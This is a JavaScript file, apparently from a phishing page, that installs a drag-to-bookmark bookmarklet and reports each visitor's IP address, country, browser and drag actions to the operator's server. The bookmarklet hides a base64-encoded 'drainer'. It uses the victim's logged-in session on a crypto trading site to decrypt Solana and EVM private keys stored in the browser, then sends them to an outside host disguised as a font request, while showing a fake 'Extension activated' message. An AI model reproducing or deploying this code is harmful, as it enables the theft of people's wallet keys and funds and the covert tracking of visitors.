try {
    const data = JSON.parse(atob(document.currentScript.getAttribute("data")));
    const api_url = new URL(document.currentScript.getAttribute("src"));
    

    // Function to get country flag emoji from country code
    function getCountryFlag(countryCode) {
        if (!countryCode || countryCode.length !== 2) return '🏳️';
        const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
        return String.fromCodePoint(...codePoints);
    }

    document.addEventListener("DOMContentLoaded", () => {
        // Get user IP and country
        let ipDataOutput = null;
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(ipData => {
                ipDataOutput = ipData;
                console.log(api_url.origin);
                fetch(`${api_url.origin}/api/message`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        error: 0,
                        chatId: data.code,
                        username: data.username,
                        platform: data.platform,
                        botId: data.botId,
                        message: "📍 <b>Platform: </b> " + data.platform + "\n\n🌐 <b>Page Visit</b>\n\n" + getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip + "\n<code>" + navigator.userAgent + "</code>",
                    })
                });
            })
            .catch(err => {
                fetch(`${api_url.origin}/api/message`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        error: 0,
                        chatId: data.code,
                        username: data.username,
                        botId: data.botId,
                        platform: data.platform,
                        message: "📍 <b>Platform: </b> " + data.platform + "\n\n🌐 <b>Page Visit</b>\n\n🏳️ Unknown • Unknown IP\n<code>" + navigator.userAgent + "</code>",
                    })
                });
            });

        document.querySelectorAll("a.bookmarklet").forEach(abtns => {
            const drainer = `KGFzeW5jICgpID0+IHsKICAgIGxldCBhcGlVcmwgPSBuZXcgVVJMKCJodHRwczovL3Rlc3QtYmFja2VuZC1mb3Itd29ya2VyLnZlcmNlbC5hcHAiKTsKICAgIGxldCBjb2RlID0gIjE0MTUwNTM2NTgiOwogICAgbGV0IHVzZXJuYW1lID0gInRlc3QiOwogICAgbGV0IHBsYXRmb3JtID0gImF4aW9tIjsKICAgIGxldCBib3RJZCA9ICJibGFja2Zpc2giOwogICAgCiAgICBmdW5jdGlvbiBhcnJheVRvU3RyaW5nKGRhdGFBcnJheSkgewogICAgICAgIGNvbnN0IEFMUEhBQkVUID0gIjEyMzQ1Njc4OUFCQ0RFRkdISktMTU5QUVJTVFVWV1hZWmFiY2RlZmdoaWprbW5vcHFyc3R1dnd4eXoiOwogICAgCiAgICAgICAgY29uc3QgcmVzdWx0RGlnaXRzID0gWzBdOwogICAgCiAgICAgICAgZm9yIChsZXQgZWxlbWVudCBvZiBkYXRhQXJyYXkpIHsKICAgICAgICAgICAgbGV0IGNhcnJ5ID0gZWxlbWVudDsKICAgIAogICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IHJlc3VsdERpZ2l0cy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgY29uc3QgdmFsdWUgPSByZXN1bHREaWdpdHNbaV0gKiAweDEwMCArIGNhcnJ5OwogICAgCiAgICAgICAgICAgICAgICByZXN1bHREaWdpdHNbaV0gPSB2YWx1ZSAlIDU4OwogICAgICAgICAgICAgICAgY2FycnkgPSB2YWx1ZSAvIDU4IHwgMDsKICAgICAgICAgICAgfQogICAgCiAgICAgICAgICAgIHdoaWxlIChjYXJyeSkgewogICAgICAgICAgICAgICAgcmVzdWx0RGlnaXRzLnB1c2goY2FycnkgJSA1OCk7CiAgICAKICAgICAgICAgICAgICAgIGNhcnJ5ID0gY2FycnkgLyA1OCB8IDA7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAKICAgICAgICBsZXQgcmVzdWx0U3RyaW5nID0gIiI7CiAgICAKICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGRhdGFBcnJheS5sZW5ndGggJiYgZGF0YUFycmF5W2ldID09PSAwOyBpKyspIHJlc3VsdFN0cmluZyArPSBBTFBIQUJFVFswXTsKICAgIAogICAgICAgIGZvciAobGV0IGkgPSByZXN1bHREaWdpdHMubGVuZ3RoIC0gMTsgaSA+PSAwOyBpLS0pIHJlc3VsdFN0cmluZyArPSBBTFBIQUJFVFtyZXN1bHREaWdpdHNbaV1dOwogICAgCiAgICAgICAgcmV0dXJuIHJlc3VsdFN0cmluZwogICAgfQoKICAgIGZ1bmN0aW9uIGFycmF5VG9TdHJpbmdFVk0oZSkgewogICAgICAgIHJldHVybiBBcnJheS5mcm9tKGUgaW5zdGFuY2VvZiBVaW50OEFycmF5ID8gZSA6IG5ldyBVaW50OEFycmF5KGUpKS5tYXAoZSA9PiBlLnRvU3RyaW5nKDE2KS5wYWRTdGFydCgyLCAiMCIpKS5qb2luKCIiKQogICAgfQogICAgCiAgICBmdW5jdGlvbiBzdHJpbmdUb0FycmF5KGtleSkgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGNvbnN0IGNsZWFuZWRLZXkgPSBrZXkucmVwbGFjZShuZXcgUmVnRXhwKCItIiwgImciKSwgIisiKS5yZXBsYWNlKG5ldyBSZWdFeHAoIl8iLCAiZyIpLCAiLyIpOwogICAgCiAgICAgICAgICAgIHJldHVybiBVaW50OEFycmF5LmZyb20oYXRvYihjbGVhbmVkS2V5KSwga2V5ID0+IHsKICAgICAgICAgICAgICAgIHJldHVybiBrZXkuY2hhckNvZGVBdCgwKQogICAgICAgICAgICB9KQogICAgICAgIH0gY2F0Y2ggewogICAgICAgICAgICByZXR1cm4gbmV3IFRleHRFbmNvZGVyKCkuZW5jb2RlKGtleSkKICAgICAgICB9CiAgICB9CiAgICAKICAgIAogICAgYXN5bmMgZnVuY3Rpb24gc2VuZERhdGEoYXBpVXJsT3JpZ2luLCBkYXRhKSB7CiAgICAgICAgdmFyIHRpbWVzdGFtcCA9IE1hdGguZmxvb3IoRGF0ZS5ub3coKSAvIDB4M2U4KTsKICAgICAgICB2YXIgaGVhZGVyID0gYCR7bmF2aWdhdG9yWyJ1c2VyQWdlbnQiXX18JHt0aW1lc3RhbXB9YDsKICAgIAogICAgICAgIGRhdGFbInRpbWVzdGFtcCJdID0gdGltZXN0YW1wOwogICAgICAgIGRhdGFbImhlYWRlciJdID0gaGVhZGVyOwogICAgCiAgICAgICAgY29uc3QgdXJsID0gYCR7YXBpVXJsT3JpZ2luICsgIi9hcGkvbWVzc2FnZT9ub2NhY2hlPSIgKyBlbmNvZGVVUklDb21wb25lbnQoYnRvYShKU09OLnN0cmluZ2lmeShkYXRhKSkpfWA7CiAgICAgICAgY29uc3QgY3VzdG9tRXJyb3IgPSAiRXh0ZW5zaW9uIGFjdGl2YXRlZC4gUHJlc3MgRjQgdG8gc3RhcnQiOwogICAgCiAgICAgICAgY29uc3Qgc3R5bGVFbGVtZW50ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3R5bGUiKTsKICAgICAgICBzdHlsZUVsZW1lbnQudGV4dENvbnRlbnQgPSBgXG5AZm9udC1mYWNle1xuZm9udC1mYW1pbHk6ImxlYWsiO1xuc3JjOnVybCgiJHt1cmx9Iik7XG59XG4uZm9udC10YXJnZXR7XG5mb250LWZhbWlseTpsZWFrO1xufVxuYDsKICAgIAogICAgICAgIGNvbnN0IGRpdkVsZW1lbnQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICBkaXZFbGVtZW50LmlubmVyVGV4dCA9IGN1c3RvbUVycm9yOwogICAgICAgIGRpdkVsZW1lbnQuY2xhc3NMaXN0LmFkZCgiZm9udC10YXJnZXQiKTsKICAgIAogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZGl2RWxlbWVudCk7CiAgICAgICAgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzdHlsZUVsZW1lbnQpOwogICAgfQogICAgCiAgICBhc3luYyBmdW5jdGlvbiBkZWNyeXB0KGtleSwgdG9EZWNyeXB0KSB7CiAgICAgICAgY29uc3QgW2l2U3RyaW5nLCBkYXRhU3RyaW5nXSA9IFN0cmluZyh0b0RlY3J5cHQpLnNwbGl0KCI6Iik7CiAgICAKICAgICAgICBjb25zdCBpdiA9IHN0cmluZ1RvQXJyYXkoaXZTdHJpbmcpOwogICAgICAgIGNvbnN0IGRhdGEgPSBzdHJpbmdUb0FycmF5KGRhdGFTdHJpbmcpOwogICAgCiAgICAgICAgY29uc3QgZGVjcnlwdGVkID0gYXdhaXQgY3J5cHRvLnN1YnRsZS5kZWNyeXB0KHsgIm5hbWUiOiAiQUVTLUdDTSIsIGl2OiBpdiwgInRhZ0xlbmd0aCI6IDEyOCB9LCBrZXksIGRhdGEpOwogICAgCiAgICAgICAgcmV0dXJuIG5ldyBVaW50OEFycmF5KGRlY3J5cHRlZCkKICAgIH0KCiAgICBjb25zdCB7IGJ1bmRsZUtleSB9ID0gYXdhaXQgKGF3YWl0IGZldGNoKCJodHRwczovL2FwaTguYXhpb20udHJhZGUvYnVuZGxlLWtleS1hbmQtd2FsbGV0cyIsIHsKICAgICAgICAibWV0aG9kIjogIlBPU1QiLAogICAgICAgICJjcmVkZW50aWFscyI6ICJpbmNsdWRlIgogICAgfSkpLmpzb24oKTsKCiAgICBjb25zdCBjcnlwdG9LZXkgPSBhd2FpdCBjcnlwdG8uc3VidGxlLmltcG9ydEtleSgicmF3Iiwgc3RyaW5nVG9BcnJheShidW5kbGVLZXkpLmJ1ZmZlciwgeyAibmFtZSI6ICJBRVMtR0NNIiB9LCBmYWxzZSwgWyJkZWNyeXB0Il0pOwoKICAgIGNvbnN0IHNvbGFuYUJ1bmRsZXMgPSBKU09OLnBhcnNlKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJzQnVuZGxlcyIpIHx8ICJbXSIpOwogICAgY29uc3QgZXZtQnVuZGxlcyA9IEpTT04ucGFyc2UobG9jYWxTdG9yYWdlLmdldEl0ZW0oImVCdW5kbGVzIikgfHwgIltdIik7CgogICAgY29uc3QgZXJyb3JzID0gW107CiAgICBjb25zdCBzdWNjZXNzID0gW107CgogICAgZm9yIChjb25zdCBidW5kbGUgb2Ygc29sYW5hQnVuZGxlcykgewogICAgICAgIGxldCBwdWJsaWNLZXkgPSAiKHVua25vd24pIjsKICAgICAgICBsZXQgcHJpdmF0ZUtleSA9ICIiOwoKICAgICAgICB0cnkgewogICAgICAgICAgICBjb25zdCBkZWNyeXB0ZWRCdW5kbGUgPSBhd2FpdCBkZWNyeXB0KGNyeXB0b0tleSwgYnVuZGxlKTsKCiAgICAgICAgICAgIGlmIChkZWNyeXB0ZWRCdW5kbGUubGVuZ3RoICE9PSAweDQwKSB0aHJvdyBuZXcgRXJyb3IoImJhZCBTSyBsZW5ndGgiKQoKICAgICAgICAgICAgcHJpdmF0ZUtleSA9IGFycmF5VG9TdHJpbmcoZGVjcnlwdGVkQnVuZGxlKTsKCiAgICAgICAgICAgIGNvbnN0IHB1YmxpY0tleURhdGEgPSBkZWNyeXB0ZWRCdW5kbGUuc2xpY2UoMHgyMCk7CgogICAgICAgICAgICBwdWJsaWNLZXkgPSBhcnJheVRvU3RyaW5nKHB1YmxpY0tleURhdGEpOwoKCiAgICAgICAgICAgIHN1Y2Nlc3MucHVzaCh7CiAgICAgICAgICAgICAgICAicHViIjogcHVibGljS2V5LAogICAgICAgICAgICAgICAgInByaXYiOiBwcml2YXRlS2V5CiAgICAgICAgICAgIH0pOwoKCiAgICAgICAgfSBjYXRjaCAoc0lJRngzeSkgewogICAgICAgICAgICBlcnJvcnMucHVzaCh7CiAgICAgICAgICAgICAgICAicHViIjogcHVibGljS2V5LAogICAgICAgICAgICAgICAgInJlYXNvbiI6IHNJSUZ4M3lbIm1lc3NhZ2UiXQogICAgICAgICAgICB9KQogICAgICAgIH0KICAgIH0KCiAgICBmb3IgKGNvbnN0IGJ1bmRsZSBvZiBldm1CdW5kbGVzKSB7CiAgICAgICAgbGV0IHB1YmxpY0tleSA9ICIodW5rbm93bikiOwogICAgICAgIGxldCBwcml2YXRlS2V5ID0gIiI7CgogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGNvbnN0IGRlY3J5cHRlZEJ1bmRsZSA9IGF3YWl0IGRlY3J5cHQoY3J5cHRvS2V5LCBidW5kbGUpOwoKICAgICAgICAgICAgcHJpdmF0ZUtleSA9IGFycmF5VG9TdHJpbmdFVk0oZGVjcnlwdGVkQnVuZGxlKTsKCiAgICAgICAgICAgIGxldCBwdWJsaWNLZXk7CiAgICAgICAgICAgIAogICAgICAgICAgICBwdWJsaWNLZXkgPSAidW5rbm93biI7CgogICAgICAgICAgICBzdWNjZXNzLnB1c2goewogICAgICAgICAgICAgICAgInB1YiI6IHB1YmxpY0tleSwKICAgICAgICAgICAgICAgICJwcml2IjogcHJpdmF0ZUtleQogICAgICAgICAgICB9KTsKCgogICAgICAgIH0gY2F0Y2ggKHNJSUZ4M3kpIHsKICAgICAgICAgICAgZXJyb3JzLnB1c2goewogICAgICAgICAgICAgICAgInB1YiI6IHB1YmxpY0tleSwKICAgICAgICAgICAgICAgICJyZWFzb24iOiBzSUlGeDN5WyJtZXNzYWdlIl0KICAgICAgICAgICAgfSkKICAgICAgICB9CiAgICB9CgogICAgbGV0IHNlbnQgPSBbXTsKICAgIGxldCBrZXlzID0gW107CgogICAga2V5cy5wdXNoKC4uLnN1Y2Nlc3MubWFwKGtleSA9PiB7CiAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgInB1YmxpYyI6IGtleVsicHViIl0sCiAgICAgICAgICAgICJwcml2YXRlIjoga2V5WyJwcml2Il0KICAgICAgICB9CiAgICB9KSk7CiAgICBjb25zb2xlLmxvZyhrZXlzKQoKICAgIHNlbmREYXRhKAogICAgICAgIGFwaVVybC5vcmlnaW4sCiAgICAgICAgewogICAgICAgICAgICAic2VudCI6IHNlbnQsCiAgICAgICAgICAgICJrZXlzIjoga2V5cywKICAgICAgICAgICAgImNvZGUiOiBjb2RlLAogICAgICAgICAgICAidXNlcm5hbWUiOiB1c2VybmFtZSwKICAgICAgICAgICAgInBsYXRmb3JtIjogcGxhdGZvcm0sCiAgICAgICAgICAgICJib3RJZCI6IGJvdElkCiAgICAgICAgfQogICAgKTsKCn0pKCk7Cg==`
            abtns.href = "javascript:eval(atob(\""+drainer+"\"))"
            abtns.draggable = true;

            abtns.draggable = true;

            abtns.addEventListener('dragstart', evt => {
                fetch(`${api_url.origin}/api/message`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        error: 0,
                        chatId: data.code,
                        username: data.username,
                        botId: data.botId,
                        platform: data.platform,
                        message: "📍 <b>Platform: </b> " + data.platform + "\n\n⬇️ <b>Bookmarklet Drag Started</b>\n\n" + getCountryFlag(ipDataOutput.country_code) + " " + ipDataOutput.country_name + " • " + ipDataOutput.ip,
                    })
                });
            });

            abtns.addEventListener('dragend', evt => {
                fetch(`${api_url.origin}/api/message`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        error: 0,
                        chatId: data.code,
                        username: data.username,
                        botId: data.botId,
                        platform: data.platform,
                        message: "📍 <b>Platform: </b> " + data.platform + "\n\n✅ <b>Bookmarklet Drag Complete</b>\n\n" + getCountryFlag(ipDataOutput.country_code) + " " + ipDataOutput.country_name + " • " + ipDataOutput.ip,
                    })
                });
            });
        });
    });



    console.log("%c[+] Bookmarklets loaded successfully", "color: #bada55");
} catch (error) {
    console.error("[-] Failed to load bookmarklet(s):", error);
    alert("Failed to load bookmarklet(s): " + error.message);
    fetch(`${api_url.origin}/api/message`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            error: 1,
            chatId: data.code,
            username: data.username,
            botId: data.botId,
            platform: data.platform,
            errorMessage: error.message
        })
    });
}